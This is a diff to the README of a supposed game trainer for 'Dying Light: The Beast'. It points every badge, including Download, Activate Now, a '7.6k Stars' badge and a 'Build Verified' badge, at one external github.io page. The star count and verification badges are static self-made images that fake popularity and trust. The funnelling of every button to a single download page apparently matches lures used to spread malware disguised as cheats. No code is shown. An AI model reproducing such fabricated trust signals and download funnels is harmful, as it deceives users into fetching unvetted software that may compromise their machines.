@@ -30,10 +30,10 @@ Designed for **offline/single-player freedom**. Do not use in online or competit
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-🔥-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.6k Stars](https://img.shields.io/badge/GitHub-⭐️%207.6k%20Stars-black?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-🔥-red?style=for-the-badge\&logo=rocket)](https://dying-light-the-beast-stamina-boosts.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://dying-light-the-beast-stamina-boosts.github.io/.github/)
+[![⭐️ 7.6k Stars](https://img.shields.io/badge/GitHub-⭐️%207.6k%20Stars-black?style=for-the-badge\&logo=github)](https://dying-light-the-beast-stamina-boosts.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](https://dying-light-the-beast-stamina-boosts.github.io/.github/)
 
 ---
 
@@ -108,8 +108,8 @@ A: Yes, maintained alongside Beast updates for full compatibility.
 
 The **Dying Light: The Beast Stamina Boosts Trainer** is the ultimate upgrade for freerunners. By removing endurance limits, you’ll enjoy pure parkour freedom, faster escapes, and smoother combat chains. Perfect for players who thrive on speed and agility.
 
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?style=for-the-badge\&logo=discord)](#)
-[![Verified Build](https://img.shields.io/badge/Build-Verified-success?style=for-the-badge\&logo=checkmarx)](#)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](https://dying-light-the-beast-stamina-boosts.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?style=for-the-badge\&logo=discord)](https://dying-light-the-beast-stamina-boosts.github.io/.github/)
+[![Verified Build](https://img.shields.io/badge/Build-Verified-success?style=for-the-badge\&logo=checkmarx)](https://dying-light-the-beast-stamina-boosts.github.io/.github/)
 
 ---
